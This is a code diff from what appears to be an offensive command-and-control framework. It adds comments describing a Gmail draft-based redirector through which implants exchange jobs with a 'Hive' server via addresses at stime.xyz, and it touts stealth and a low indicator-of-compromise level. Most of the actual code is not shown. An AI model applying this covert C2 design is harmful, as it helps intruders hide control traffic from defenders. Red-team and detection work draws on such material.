@@ -5,7 +5,7 @@
 //
 //   Warnings:       The top notch stealth					 
 //					 
-//	 Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//	 Fingenprint:    "None", Implant connect to a SaaS
 //
 //   IOC Level:      Low
 //   
@@ -31,6 +31,10 @@ import (
 
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type Reds struct {
     Redirectors []string   `json:"redirectors"`
 }
@@ -48,8 +52,16 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
-// Transport Level Socket Function
-
+/*
+Description: GmailGo Module Redirector Handler
+Note: SaaS Handlers work differently from normal Network Modules
+While network modules, the trigger to start flows are the connection of Implants, SaaS redirectors will be querying target accounts
+each a constant amount of time.
+Flow:
+A. Extract from the JSON Encoded string the parameters needed for this module
+    A1. Loop within "SaaS" Redirectors/Accounts and decode,adding these Connected apps data to a Slice
+B. Start a blocked Loop to query back the list of Accounts for Implant activity each 500 mS
+*/
 func bichitoHandler(){
 
     var error string
@@ -101,7 +113,17 @@ func bichitoHandler(){
 
 }
 
-
+/*
+Description: Query Gmail to inspect Implant activity, and retrieve/Send Jobs
+Flow:
+A. Retrieve an access token from Gmail Auth Servers, using connected app credentials
+B. List all the drafts from the account
+C. Set noActive to true, this will be useful to detect if an gmail Account becomes inactive and mark it later on
+C. Inspect each draft -->
+    C1.If the draft has as "to:" "redirector@stime.xyz", retrieve the Body, and send it as a Job to Hive
+    C2.Get the Subject from the draft (this is the bichito BID), retrieve possible Jobs from Hive headed to that BID
+       and encode them in a draft body with "to:bichito@stime.xyz" and the subject the BID
+*/
 func gmailFlow() string{
 
     //Auth
